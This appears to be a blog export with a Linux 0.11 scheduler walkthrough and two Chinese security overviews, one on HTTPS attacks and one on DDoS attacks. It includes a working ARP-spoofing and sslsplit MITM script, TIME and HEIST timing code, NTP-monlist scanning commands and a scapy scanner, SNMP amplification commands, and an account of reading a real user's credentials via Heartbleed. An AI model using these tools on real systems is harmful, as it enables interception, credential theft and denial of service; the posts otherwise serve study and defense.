copy_process的主要作用是对父进程的状态进行拷贝并赋给新进程，参数nr就是find_empty_process的返回值，它是task数组的下标，在这段代码里，我们可以看到有两处切换点： 12p-&gt;state = TASK_UNINTERRUPTIBLE;p-&gt;state = TASK_RUNNING; schedule schedule 是进程调度函数，它可以说是进程切换的核心部分，先来看一下 Linus Torvalds 巨佬对这个函数的描述，便可知其重要性 /* * &apos;schedule()&apos; is the scheduler function. This is GOOD CODE! There * probably won&apos;t be any reason to change this, as it should work well * in all circumstances (ie gives IO-bound processes good response etc). * The one thing you might take a look at is the signal-handler code here. * * NOTE!! Task 0 is the &apos;idle&apos; task, which gets called when no other * tasks can run. It can not be killed, and it cannot sleep. The &apos;state&apos; * information in task[0] is never used. */ 代码简短而精彩 123456789101112131415161718192021222324252627282930313233343536373839void schedule(void)&#123; int i,next,c; struct task_struct ** p;/* check alarm, wake up any interruptible tasks that have got a signal */ for(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) if (*p) &#123; if ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123; (*p)-&gt;signal |= (1&lt;&lt;(SIGALRM-1)); (*p)-&gt;alarm = 0; &#125; if (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp; (*p)-&gt;state==TASK_INTERRUPTIBLE) (*p)-&gt;state=TASK_RUNNING; &#125;/* this is the scheduler proper: */ while (1) &#123; c = -1; next = 0; i = NR_TASKS; p = &amp;task[NR_TASKS]; while (--i) &#123; if (!*--p) continue; if ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c) c = (*p)-&gt;counter, next = i; &#125; if (c) break; for(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) if (*p) (*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; 1) + (*p)-&gt;priority; &#125; switch_to(next);&#125; 在第一个 for 循环里，程序从最后一个任务开始向前遍历，如果信号位图中除被阻塞的信号外还有其他信号，并且任务处于TASK_INTERRUPTIBLE，则将其置为TASK_RUNNING，此处为一个切换点。 在 wihle 循环里，会先选出时间片最大的进程，如果所有进程的时间片均用完，则会对所有进程更新其时间片。 最后，通过switch_to跳转到时间片最大（或者说优先级最高）的进程。 sys_pause source code 123456int sys_pause(void)&#123; current-&gt;state = TASK_INTERRUPTIBLE; schedule(); return 0;&#125; 该函数是pause()函数的系统调用。在init/main.c中有 1for(;;) pause(); 表示在没有其他任务时，任务 0 会不断的执行主动让出的操作。调用sys_pause时，会先将自己的状态置为睡眠态（TASK_INTERRUPTIBLE），此处为一切换点。然后执行调度函数跳转到其他可执行的任务（当然如果没有可执行的任务，schdule 中的 next 仍为 0，又会跳回任务 0） sleep_on source code 12345678910111213141516void sleep_on(struct task_struct **p)&#123; struct task_struct *tmp; if (!p) return; if (current == &amp;(init_task.task)) panic("task[0] trying to sleep"); tmp = *p; *p = current; current-&gt;state = TASK_UNINTERRUPTIBLE; schedule(); *p = tmp; // 这行在源码里没有，但应该加上，因为当前进程已被唤醒，需将等待队列头指针指回之前的任务 if (tmp) tmp-&gt;state=0;&#125; 这部分是把当前任务（即调用者）置为不可中断的等待状态，并让睡眠队列头指针指向当前任务 首先，函数参数传入的是指针的指针，正如初学c语言时写的 swap 函数，要想在调用函数里更改两个变量的值，需要传入变量的地址。而在内核代码中，定义的任务变量本身就是一个指针，要想在调用函数里改变其状态，就需要传递指针的地址。 接下来对当前进程进行判断，如果是任务 0，则予以警告，不允许任务 0进入睡眠状态 tmp = *p是将tmp指向已经在等待队列头的任务 *p = current是将睡眠队列头的指针指向当前任务，即把当前任务插入到了等待队列中 current-&gt;state = TASK_UNINTERRUPTIBLE是将当前任务的状态置为TASK_UNINTERRUPTIBLE，此处为一切换点 接着先执行schedule进程调度函数，当被唤醒时（wake_up，后面介绍），会将tmp指向的等待任务（即位于原等待队列头的任务）的状态置为TASK_RUNNING（tmp-&gt;state = 0），此处为一切换点 对于由tmp隐式构成的等待队列，可以对照《Linux内核完全注释》中的图来理解： interruptible_sleep_on source code 1234567891011121314151617181920void interruptible_sleep_on(struct task_struct **p)&#123; struct task_struct *tmp; if (!p) return; if (current == &amp;(init_task.task)) panic("task[0] trying to sleep"); tmp=*p; *p=current;repeat: current-&gt;state = TASK_INTERRUPTIBLE; schedule(); if (*p &amp;&amp; *p != current) &#123; (**p).state=0; goto repeat; &#125; *p=NULL;// 同理，这里应该是 *p = tmp if (tmp) tmp-&gt;state=0;&#125; 和sleep_on函数功能类似，只是这里是将当前任务的状态置为可中断等待状态（TASK_INTERRUPTIBLE），其他切换点的位置和sleep_on的基本相同，不过多了一处(**p).state = 0，意思是将在当前任务入队之后加进等待队列的任务唤醒。 wake_up source code 1234567void wake_up(struct task_struct **p)&#123; if (p &amp;&amp; *p) &#123; (**p).state=0; *p=NULL; // 此处应该删去 &#125;&#125; 该函数用来唤醒等待队列头指针指向的任务（即最后入队的任务），(**p).state=0是一个切换点 do_exit source code 12345678910111213141516171819202122int do_exit(long code)&#123; int i; free_page_tables(get_base(current-&gt;ldt[1]),get_limit(0x0f)); free_page_tables(get_base(current-&gt;ldt[2]),get_limit(0x17)); for (i=0 ; i&lt;NR_TASKS ; i++) if (task[i] &amp;&amp; task[i]-&gt;father == current-&gt;pid) &#123; task[i]-&gt;father = 1; if (task[i]-&gt;state == TASK_ZOMBIE) /* assumption task[1] is always init */ (void) send_sig(SIGCHLD, task[1], 1); &#125; ... current-&gt;state = TASK_ZOMBIE; current-&gt;exit_code = code; tell_father(current-&gt;father); schedule(); return (-1); /* just to suppress warnings */&#125; 首先释放调用该函数的进程的代码段和数据段所占的内存页。如果当前进程有子进程，则将这些子进程的父进程改为进程 1,即 init 进程 之后进行一系列资源释放操作，然后将当前进程的状态置为TASK_ZOMBIE，此处为一切换点 sys_waitpid 源码中有一处current-&gt;state = TASK_INTERRUPTIBLE，此处为一切换点总结在 Linux 0.11 内核版本中，进程状态的切换发生在如下文件中 就绪态和运行态的相互转换 schedule() 运行态到睡眠态 sleep_on interruptible_sleep_on sys_pause sys_waitpid 睡眠态到就绪态 sleep_on interruptible_sleep_on wake_up]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[https攻击小结]]></title>
    <url>%2F2018%2F01%2F29%2Fhttps%E6%94%BB%E5%87%BB%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x00 前言 HTTPS 的全称是 Hyper Text Transfer Protocol over Secure Socket Layer，从字面上看便可得知其是 HTTP 基于 SSL/TLS 的应用。因此，有许多攻击手法实际上是针对安全套接层的攻击。 本篇文章有如下几个部分组成——协议漏洞分析（目前的 TLS 协议设计比较完善，但对于 较久的版本以及 SSL 协议，有很多设计上的漏洞。可以借这些现有漏洞进行攻击。）、中间人攻击（逻辑上的攻击）以及一些其他东西。 文章中若有不当之处，还望师傅们指正 :) 0x01 协议攻击与漏洞利用BEAST 攻击（CVE-2011-3389）攻击对象 针对 TLS 1.0 和更早版本的协议中对称加密算法的 CBC 模式攻击原理 CBC 模式有两种基本的使用方式： 为每个要加密的数据块都准备一个随机数（TLS 1.1、TLS 1.2） 对加密数据的开头使用一个随机数，之后当前数据块加密之后的密文会作为下一个数据块的 IV（SSL 3、TLS 1.0） 对于下图，M₂ 是保密数据（如cookie等），我们想通过精心构造的 M₃ 去猜测 M₂，具体步骤如下： 在 CBC 模式中我们知道： C₂ = E(M₂ ⊕ IV₂) = E(M₂ ⊕ C₁) C₃ = E(M₃ ⊕ IV₃) = E(M₃ ⊕ C₂) C₁(IV₂)、C₂(IV₃) 是已知的（在网络上传输），假设 Mₓ 是我们要猜测的结果，构造出特殊的 M₃： M₃ = Mₓ ⊕ C₁ ⊕ C₂ 对 M₃ 进行加密： C₃ = E(M₃ ⊕ C₂) = E(Mₓ ⊕ C₁ ⊕ C₂ ⊕ C₂) = E(Mₓ ⊕ C₁) 当 C₃ 和 C₂ 的值想等时，则可知，此时的 Mₓ 等于 M₂ 实际攻击的前提条件 协议版本 &lt;= TLS 1.0； 中间人代理（可以截获数据包）； 影响敏感信息在 HTTP 请求中的位置； 攻击者能够接管客户端浏览器（执行 JavaScript）。 PoC github 上给出的一个验证性 PoC https://github.com/mpgn/BEAST-PoC/blob/master/BEAST-poc.py CRIME 攻击（CVE-2012-4929）压缩旁路攻击 本质上，所有的无损压缩算法都是通过==去重==的方式展开工作的； 如果能让任意的数据（猜测数据）和某些加密数据在同一个上下文中被压缩，通过观察压缩数据的输出，能确定猜测是否正确。如下图：攻击原理 与实现 BEAST 一样： 攻击者必须能够操作受害者的浏览器来向目标服务器提交大量的请求，与此同时观察网络上发出的数据包。每次请求都将是一次猜测； 与 BEAST 不同的是，CRIME 对请求的内容和时机没有较强的要求 TIME 攻击攻击原理 也是一类压缩旁路攻击，CRIME 是通过观察压缩输出中 1 字节的差异来实现攻击（需要比较前后两次包的长度），而 TIME 是通过观察时间差。 下面就简单介绍 TIME 是如何利用时间信息作为成功匹配字符的判断标准。 结合 TCP 中的窗口控制协议，我们知道，为了高效的传递数据，TCP 允许通信双方每次发送多个数据包，当然，为了不让任何一端负载过大，他们在建立互连时会协商一个限制，即拥塞窗口。拥塞窗口在一开始会比较小，之后会呈现短期的增长趋势，即慢启动; 在初次建立连接的时候，如果发送的数据比较小，不足一个初始的拥塞窗口大小（通常为 15KB），数据将一次发送完毕； 如果数据很大，则第一次回尽可能多地发送数据，然后等待服务器端的确认，之后再发送剩下的数据。这样会增加一次 RTT（往返时间）； 为了将此特征作为一个时间预示来使用，我们可以增大数据的大小直到完全填满初始拥塞窗口。如果此时再增加 1 字节，请求就会导致一个额外的 RTT，这种延迟可以通过JavaScript 中判断出来； 这时，便可以利用压缩，如果构造的数据导致压缩的大小减小了 1 字节，请求将会导致较短的 RTTPoC下面是作者给出的PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* author: Amichai Shulman、Tal Be’ery*/function makeString(index) &#123; var text = ""; var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for( var i=0; i &lt; index; i++ ) text += possible.charAt(Math.floor(Math.random() * possible.length)); return text;&#125;var xmlhttp;function printTime() &#123; if(xmlhttp.readyState == 4) &#123; var date2 = new Date(); curTime = date2.getTime(); var n = curTime - ref; document.write("," + n + "&lt;BR&gt;"); if (count &gt; 0) &#123; count = count - 1; if (count%2 == 0) &#123; len = UrlLegnth; &#125; else &#123; len = UrlLegnth + 1; &#125; SendRequest(len); &#125; &#125;&#125;function SendRequest(length) &#123; var garbage1 = makeString(length); xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = printTime; document.write(length); var site = "http://edition.cnn.com/?"; var URL = site + garbage1; xmlhttp.open("GET", URL, true); date1 = new Date(); ref = date1.getTime(); xmlhttp.send(null);&#125;UrlLegnth = 2588;SendRequest(UrlLegnth);var date1;var ref;var count =30; BREACH（BlackHat，2013）攻击原理 是一种针对 HTTP 响应的压缩旁路攻击，攻击者需要在响应正文中找到一个注入点，请求的参数(比如一个 CSRF Token）会被响应正文携带回来，当内容有相同时，响应正文会变小（这可以通过观察网络数据获知）。之后的步骤便和 CRIME 一样了。PoC 作者给出的 PoC https://github.com/nealharris/BREACH HEIST 攻击（BlackHat，2016）攻击原理 HEIST 沿用了 TIME 攻击中利用 TCP 拥塞窗口的边信道攻击，结合了 fetch api 展开压缩旁路攻击。实际攻击的前提条件 采用 gzip/ssl 压缩 目标站存在反射点 具体步骤 确定响应包大小是否在一个 TCP 窗口内 在 JS 层面,向目标网站发送一个跨域资源请求,通过 fetch 和 performance 对收到回复的时间点进行观察。假设 T1 为攻击者收到第一个字节是的时间, T2 为攻击者收到完整包的时间,观察 T2-T1 的值,如果这个值很小( 1ms 左右),则 response 仅占用了一个窗口大小;反之,占用多个窗口。例如: 123456789101112131415161718fetch(url+reflection, &#123; mode: 'no-cors', credentials: 'include'&#125;).then( (res) =&gt; &#123; window.T1 = performance.now();&#125;);let resDone = () =&gt; &#123; let [ entries, lastEntry=entries[entries.length-1] ] = [ performance.getEntries() ]; if ( lastEntry.name.startsWith(url) ) &#123; window.T2 = lastEntry.responseEnd; if is_singleWin(window.T2, window.T1) &#123; &#125; &#125;&#125; setInterval(resDone, 1); 确定响应包的具体大小 如图：按图示方法逐个试,找到初始窗口大小； 对于大的回复包( &gt; 初始化的 cwnd ),进行与第二步同样的探测方法; 作者给出的方法是: 发送请求到已知大小的资源(第 2 步做的工作) ; 响应进入后,向目标资源发送请求,重复步骤 2 如果有必要,对 HTTP 2 进行调整; 这方面还没有深入了解,据作者说, HTTP 2 更容易实施 HEIST 攻击 Exploit 爆破、匹配字符 心脏滴血（CVE-2014-0160）攻击对象 OpenSSL 1.0.1 - 1.0.1f攻击原理 OpenSSL 代码中没有对读长度进行检查，攻击者可以利用这个缺陷，在一个 HeartBeat （确保连接保活，检查对端是否可用）请求中获取到服务器进程中最大为 64 KB的数据。通过发出多个这样的请求，攻击者就可以无限制地获取内存数据（如服务器的私钥）。 心跳（Heartbeat）是一个协议扩展，添加了支持连接保活的功能（检查对端是否仍然可用），以及为 TLS 和 DTLS 发现路径最大传输单元。 影响 正如上面所说的，通过发送多个 HeartBeat 请求可以获取到服务器中的内存内容。这一漏洞是在 2014 年发现的，而直到现在仍然可以寻觅到存在心脏滴血漏洞的网站。 从 shodan 上搜索 OpenSSL/1.0.1： 可以看到 shodan 也提示了该网站受心脏滴血影响 接下来便可以用一些验证脚本或通过 msf ，可以查看受影响网站的泄漏信息 运行工具 成功读取泄漏的信息 打开文本查看，在第 13 行处找到不久前某用户在该网站的登录信息 当然，上述都是针对服务器的攻击，由于心跳协议是双向的，因此，对于存在漏洞的客户端，在连接到一个恶意网站时，客户端的部分内存数据也会遭到泄漏。 POODLE（CVE-2014-3566）攻击原理 POODLE 的根本原因是CBC模式在设计上的缺陷，具体来说就是CBC只对明文进行了身份验证，但是没有对填充字节进行完整性校验。这使得攻击者可以对填充字节修改并且利用填充预示来恢复加密内容，让POODLE攻击成为可能的原因是SSL3中过于松散的填充结构和校验规则。 在实际应用场景中，通常需要结合中间人，迫使握手使用一个低等级的协议或者使用低强度的密码套件，实现自愿降级，之后再结合 POODLE 。 0x02 中间人攻击SSL 剥离攻击攻击原理 中间人与客户端维持 HTTP 流，与服务器维持 HTTPS 流实际攻击的前提条件 网站不在 HSTS Preload List 中 客户端首次访问时发起的是 HTTP 访问具体步骤 客户端向某网站发起 HTTP 访问（http://……）； 中间人拦截该请求（http://……）并转发给服务端； 中间人收到服务端的响应后（301/302 跳转）立刻重定向到 https://……，并与服务端维持 SSL/TLS 连接； 中间人在本地解密从服务端接收到的 Web 内容，并将其中 &lt;a href=”https：//...”&gt; 替换成 &lt;a href=”http：//...”&gt;，将Location：https：//... 替换成 Location：http：//...，同时记录下所修改的 URL，并保存； 中间人将修改后的数据（HTTP）发给客户端； 客户端向服务器发送 HTTP 请求，中间人将其与保存的文件相比较，发现有修改的HTTP URL时，替换成原 HTTPS URL，并发送给服务器。 工具 sslstrip（kali 自带） 具体操作及源码 ED 前辈介绍过的前端劫持思路，之前在周报里写过代码分析、调试过程，但是文章的图文介绍说的非常清楚，这里就不赘述操作了 文章 代码 伪造证书攻击攻击原理 中间人与服务器建立正常的 SSL/TLS 连接，用自己伪造的证书与客户端建立连接工具 sslsniff sslsplit 实际操作（验证性）时可以通过 openssl 生成自签名的证书，为了操作方便，我写了个简单的 sh 脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/bashread -p "create a directory to deposit certificate, input the directory name:" dirmkdir "$dir"cd "$dir"waitecho -e "\e[1;33m [*] \e[0m \e[1;45m create a self signed certificate...\e[0m\n\n"openssl genrsa -out ca.key 2048openssl req -new -x509 -days 1024 -key ca.key -out ca.crtecho -e "\e[1;33m [*] \e[0m \e[1;45m start port forwarding...\e[0m\n\n"echo 1 &gt; /proc/sys/net/ipv4/ip_forwardecho -e "\e[1;33m [*] \e[0m \e[1;45m set port forwarding rules for iptables...\e[0m\n"read -p "input the redirected port(ensure this port is free):" portbnetstat -nlp | grep ":$portb"&gt;tempfile if [ -s tempfile ] then kill -9 $(netstat -nlp | grep ":$portb" | awk '&#123;print $7&#125;' | awk -F"/" '&#123; print $1 &#125;' | head -n 1)firm tempfileread -p "input the monitor port(s):" portaecho -e "\e[1;33m [*] \e[0m \e[1;45m reset iptables rules...\e[0m\n\n"iptables -t nat -Ffor num in $porta do iptables -t nat -A PREROUTING -p tcp --dport $num -j REDIRECT --to-ports $portb doneiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080read -p "target ip:" targetread -p "route ip:" routeecho -e "\e[1;33m [*] \e[0m \e[1;45m arp mitm...\e[0m\n\n"interface=$(ifconfig | awk '&#123;print $1&#125;' | head -n 1 | cut -d ":" -f 1)arpspoof -i $interface -t $target $route &amp;&gt;/dev/null &amp;arpspoof -i $interface -t $route $target &amp;&gt;/dev/null &amp;echo -e "\e[1;33m [*] \e[0m \e[1;45m sslsplit started.\e[0m\n\n"mkdir sslsplit_logsslsplit -D -l sslsplit_log/connect.log -S sslsplit_log/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 0x03 总结协议漏洞 在协议漏洞中的 CRIME、TIME、BREACH、HEIST 这些攻击有很相似的地方，都是基于压缩旁路的攻击手法，且都希望执行 JavaScript 代码从而获取敏感信息（如 CSRF Token），但是不太明白其具体用意，既然能够向客户端插入 JS，完全可以将隐藏表单中的 csrf_token 发送出去； 除了心脏滴血这个大 bug 之外，其他几种攻击方式的条件还是比较苛刻的（即便在黑帽大会上演示了 demo），尤其是 TIME 和 HEIST（均利用了 TCP 窗口控制协议）对网络环境的稳定有较高的要求； 很多安全问题想必也是因为之前的问题没有得到很好的解决，随着技术的发展，新的技术放大了之前存在的问题，这篇文章说的挺好中间人攻击 比起现有的协议漏洞的攻击，中间人攻击在实际操作中要更加高效一些，但很容易暴露，比如 ssl 剥离时在客户端的浏览器上没有绿色安全锁的标志，在证书伪造中，客户端浏览器也会弹出证书错误的警告。 0x04 安全检测 工具 openssl s_client -connect target_ip:443 sslscan –tlsall target_ip:443 sslyze –regular target_ip:443 nmap –script=ssl-enum-ciphers.nse target_website 网站 https://www.ssllabs.com/ https://myssl.com/ 0x05 参考文献 心脏滴血漏洞（漫画展示） 《HTTPS 权威指南》 一篇博客（含一些协议漏洞的 PoC） HTTPS 的相关术语]]></content>
      <categories>
        <category>proto</category>
      </categories>
      <tags>
        <tag>https</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDoS攻防小结]]></title>
    <url>%2F2017%2F10%2F16%2FDDoS%E6%94%BB%E9%98%B2%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[简介 DDoS（Distributed Denial of Service）分布式拒绝服务攻击指借助于C/S技术，将多台计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。 利用分布式的客户端，向服务提供者发起大量看似合法的请求，消耗或长期占用大量资源，从而达到拒绝服务的目的。从僵尸网络谈起僵尸网络一般指僵尸主人出于恶意目的，传播大量僵尸程序，并采用一对多方式进行控制的大型网络。僵尸网络的组建节点 普通PC利用过程 感染传播 主动性：自动化的漏洞扫描 被动性： 通常包括带有欺骗性质的电子邮件、网页挂马、即时通信、内网的文件共享、移动存储感染，以及网络存储共享等。 安装执行 通常僵尸程序一旦在受害主机上执行，就会进行一系列的自我复制、实现自启动（创建或修改注册表以保证程序开机自启动）以及隐藏（将自身复制到系统特定的目录下并设置其隐藏属性，甚至修改文件生成时间）等行为。 接入僵尸网络 当僵尸程序在受害者主机上完成各种安装和隐藏后，便通过解析内置的域名和端口进行通信，构建C&amp;C通道加入僵尸网络 命令执行 接入僵尸网络的僵尸程序将执行Botmaster预先设置好的命令，在没有收到指令时，僵尸程序会静静等待 服务器攻击Web服务器的步骤有：通过CMS或其他Web应用的漏洞拿到shell、提权、植入恶意程序或者是在访问量大的页面上挂DDoS代码 移动设备渗透步骤类似PC端 其他物联网设备 攻击手段攻击网络带宽资源直接攻击 ICMP/IGMP洪水攻击 UDP洪水攻击 原理：UDP是一种不可靠连接，在发动DoS攻击时只要确定目标机某个端口开放，直接打这个端口即可 以上两种攻击方式都极大依赖于攻击端本身的网络性能，通俗地说就是和目标机拼带宽资源 反射放大攻击反射攻击又被称为DRDoS（Distributed Reflection Denial of Service，分布式反射拒绝服务）攻击，是指利用路由器、服务器等设施对请求产生应答，从而反射攻击流量并隐藏攻击来源的一种分布式拒绝服务攻击技术。 ACK 反射攻击 DNS 放大攻击 DNS 使用的TCP与UDP端口号都是53，主要使用UDP协议。通常，DNS响应的数据包会比查询的数据包大，因此攻击者利用普通的DNS查询请求就能够发动放大攻击，并将攻击流量放大2~10倍。但更有效的方法是使用RFC 2671 中定义的 DNS 扩展机制 EDNS0 在没有EDNS0以前，对DNS查询的响应数据包被限制在512字节以内。……在EDNS0中，扩展了DNS数据包的结构，增加了OPT RR 字段。在 OPT RR 字段中，包含了客户端能够处理的最大 UDP 报文的大小，并根据该大小生成响应的报文。 攻击者能够利用dig和EDNS0进行高效的DNS放大攻击。 NTP 放大攻击 网络时间协议（Network Time Protocol，NTP）是用来使计算机时间同步化的一种协议，它可以使计算机与时钟源进行同步化并提供高精准度的时间校正，NTP使用 UDP 123 端口进行通信。 在 NTP 协议的服务器实现上，通常会实现一系列 Mode 7 的调试接口，而接口中的 monlist 请求能够获取到与目标 NTP 服务器进行同步的最后600个客户端的 IP 地址等信息。这意味着，只需要发送一个很小的请求包，就能够触发大量连续的包含 IP 地址信息等数据的 UDP 响应数据包。 据统计，只要向 NTP 放大器发送 600 个不超过 64 字节请求包（约 40KB 数据），就能够快速地将 NTP 放大器的放大倍数提高到 700 倍以上，并在该服务器的 NTP 服务关闭或重新启动之前一直保持这么大的放大倍数。 原理图 工具[root@F #] ntpdc -n -c monlist x.x.x.xscapynmap -sU -pU:123 -n --script=ntp-monlist x.x.x.x 寻找 NTP 放大攻击漏洞（@心伤的胖子） [root@F #] masscan -pU:123 -oX ntp.xml --rate 160000 start.0.0.0-end.255.255.255 对ntp.xml里的 ip 去重（如果有重复的） python scapy1234567891011121314151617181920212223242526from scapy.all import *import thread#Raw packet data used to request Monlist from NTP serverrawData = "\x17\x00\x03\x2a" + "\x00" * 61#File containing all IP addresses with NTP port open.logfile = open('output.txt', 'r')#Output file used to store all monlist enabled serversoutputFile = open('monlistServers.txt', 'a')def sniffer(): #Sniffs incomming network traffic on UDP port 48769, all packets meeting thease requirements run through the analyser function. sniffedPacket = sniff(filter="udp port 48769 and dst net 99.99.99.99", store=0, prn=analyser)def analyser(packet): #If the server responds to the GET_MONLIST command. if len(packet) &gt; 200: if packet.haslayer(IP): print packet.getlayer(IP).src #Outputs the IP address to a log file. outputFile.write(packet.getlayer(IP).src + '\n')thread.start_new_thread(sniffer, ())for address in logfile: #Creates a UDP packet with NTP port 123 as the destination and the MON_GETLIST payload. send(IP(dst=address)/UDP(sport=48769, dport=123)/Raw(load=rawData))print 'End' 防御 加固 NTP 服务： 把 NTP 服务器升级到 4.2.7p26或以上 关闭现在 NTP 服务的monlist功能，在ntp.conf配置文件中增加disable monitor选项 在网络出口封禁 UDP 123 端口 一些顶层的 NTP 服务器采用“Closed Account”选项 防御 NTP 反射和放大攻击： 由于这种攻击的特征比较明显，所以可以通过网络层或者借助运营商实施 ACL 来防御 使用防 DDoS 设备进行清洗 使用restrict … noquery 或 restrict … ignore 来限制ntpd服务响应的源地址 eg:在 NTP 配置文件中包含下面的代码行 restrict -4 default nomodify nopeer noquery notrap restrict -6 default nomodify nopeer noquery notrap http://www.team-cymru.org/templates.html 建议有：iptables -A INPUT -s 0/0 -d 0/0 -p udp --source-port 123:123 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -s 0/0 -d 0/0 -p udp --destination-port 123:123 -m state --state NEW,ESTABLISHED -j ACCEPT SNMP 放大攻击 简单网络管理协议（Simple Network Management Protocol, SNMP）是目前网络中应用最为广泛的网络管理协议，它提供了一个管理框架来监控和维护互联网设备。SNMP 协议使用 UDP 161 端口进行通信。 利用 SNMP 协议中的默认通信字符串和 GetBulk 请求，攻击者能够展开有效的 SNMP 放大攻击。 攻击者向广泛存在并开启了 SNMP 服务的网络设备发送 GetBulk 请求，使用默认通信字符串作为认证凭据，并将源 IP 地址伪造成攻击目标的 IP 地址。设备收到 GetBulk 请求后，会将响应结果发送给攻击目标。 当大量的响应结果涌向攻击目标时，就会导致攻击目标网络拥堵和缓慢，造成拒绝服务攻击。 攻击者发送的 GetBulk 请求数据包约为 60 字节，而请求的响应数据能够达到 1500 字节以上，使用该方式进行放大攻击能够达到 25 倍以上的放大效果。 工具[root@F #] snmpwalk –c public –v2c x.x.x.x oid@付弘雪 这里oid是获取snmp具体信息内容的一个标识，snmp里面存的信息是一个树状的信息结构 其实snmpwalk是获取一条oid信息，但是这个oid里面附带了下一个树节点的oid号，然后snmp会通过 snmpget继续访问下一个oid号（在getnext字段里面），来执行一个类似于循环的行为，但是snmpget的协议大家也看到了，只能获取到一条信息，79的信息长度，只能获得279的反馈，这样实现攻击的放大倍数是不给力的。关键点来了，根据rfc1441-rfc1452文档说明，snmp第二版里面引入了getbulk来取代反复getnext，用来更好的在单个请求里面获得大量的管理数据。相对应的bt5下还有个snmpbulkget命令 [root@F #] snmpbulkget -v2c -Cn0 -Cr70 -c public x.x.x.x oid 对应就是获取当前oid后面的70个团体字，这样如果你用snmpwalk跑一个1.3.6的团体字会看到很多信息，而你用bulkget这个一次就可以收到一个包里面包含70条信息的数据包 攻击链路 攻击链路与前面两种攻击方式不同，其攻击的目标并不是作为互联网端点的服务器的带宽资源，而是骨干网上的链路的带宽资源。 对链路进行攻击的一种典型的方式是 Coremelt 攻击。 攻击者通过traceroute等方式确定各个僵尸机的链路之间的相对位置，然后由攻击机控制僵尸机，使其与链路另一边的每台僵尸机进行大流量通信。使得骨干网链路拥塞甚至瘫痪。攻击系统资源 消耗系统资源的分布式拒绝服务攻击的主要目的是对系统维护的连接资源进行消耗和占用，阻止正常连接的建立，从而达到拒绝服务的目的。攻击 TCP 连接 TCP 连接洪水攻击思路：攻击者利用大量受控主机，通过快速建立大量恶意的 TCP 连接占满被攻击目标的连接表，使目标无法接受新的 TCP 连接请求，从而达到拒绝服务的目的。 SYN 洪水攻击 TCP 半开连接 在建立 TCP 连接过程中，如果在服务器返回 SYN+ACK 报文后，客户端由于某种原因没有对其进行确认，服务器将重传 SYN+ACK 报文，并等待客户端的确认报文直到 TCP 连接超时。 为了减少攻击者的暴露面以及降低攻击者的带宽资源，可以将 TCP SYN 包的源 IP 改成其他主机或不存在的 IP 地址。这里区别于 ACK 放大攻击 PSH+ACK 洪水攻击 在 TCP 数据传输的过程中，可以通过设置 PSH 标志位来表示当前数据传输结束，需要服务端进行处理。 在正常的 TCP 传输过程中，如果待发送的数据会清空发送缓冲区，那么操作系统的 TCP/IP 协议栈就会自动为该 TCP 数据包设置 PSH 标志。同样，当服务端接收到了一个设置了 PSH+ACK 标志的报文时，意味着当前数据传输已经结束，因此需要立即将这些数据递交给服务进程并清空接收缓冲区，而无须等待判断是否还会有额外的数据到达。 攻击思路： 由于带有 PSH 标志位的 TCP 数据包会强制要求接收端将接收缓冲区清空并将数据提交给应用服务进行处理，因此当攻击者利用受控主机向攻击目标发送大量的 PSH+ACK 数据包时，被攻击目标就会消耗大量的系统资源不断地进行接受缓冲区的清空处理，导致无法正常处理数据，从而造成拒绝服务。 RST 洪水攻击 在 TCP 连接的终止阶段，RST 表示复位，用来在异常时关闭连接。发送端在发送 RST 报文关闭连接时，不需要等待缓冲区中的数据包全部发送完毕，而会直接丢弃缓冲区的数据并发送 RST 报文；同样，接收端在收到 RST 报文后，也会清空缓冲区并关闭连接，并且不必发送 ACK 报文进行确认。 很多情况下，攻击者不会与被攻击者处于同一内网，导致发动 TCP RST 攻击时难以获取端口和序列号。在这种情况下，攻击者可以利用大量的受控主机猜测端口和序列号，进行盲打，发动 RST 洪水攻击。只要在数量巨大的 RST 报文中有一条与攻击目标的端口号相同，并且序列号落在目标的接收窗口之中，就能够中断连接。 TCP RST 攻击和 RST 洪水攻击多用于针对用户的拒绝服务攻击。这种攻击通常被用来攻击在线游戏或比赛的用户，从而影响比赛的结果并获得一定的经济效益。 Sockstress 攻击 在 TCP 传输数据过程中，并不是直接将数据发送到应用程序，而是先临时存储在接受缓冲区中，该缓冲区的大小由 TCP 窗口表示（ TCP 窗口控制协议）。如果 TCP 窗口大小为 0 ，则表示接受缓冲区已被填满，发送端应该停止发送数据，直到接收端的窗口发生了更新。 Sockstress 攻击就是利用该原理长时间地维持 TCP 连接，以达到拒绝服务攻击的目的。 攻击 SSL 连接 安全套接层（Secure Sockets Layer, SSL）是为网络通信提供安全及数据完整性的一种安全协议。 SSL 能够在传输层对网络连接进行加密，以防止传输的数据明文被监听和截获。 由于 SSL 协议加密、解密和密钥协商的过程中会消耗大量的系统资源，严重降低机器的性能，因此，通常只有在传输密码等机密信息时才使用 SSL 协议进行传输。 THC SSL DoS 攻击 在进行 SSL 数据传输之前，通信双方首先要进行 SSL 握手，以协商加密算法交换加密密钥，进行身份认证。一般来说，SSL 握手过程只需要进行一次即可，但是在 SSL 协议中有一个 Renegotiation 选项，通过它可以进行密钥的重新协商以建立新的密钥。THC SSL DoS 攻击就是利用 Renegotiation 选项，造成被攻击目标资源耗尽。 SSL 洪水攻击 在 SSL 握手的过程中，服务器会消耗较多的 CPU 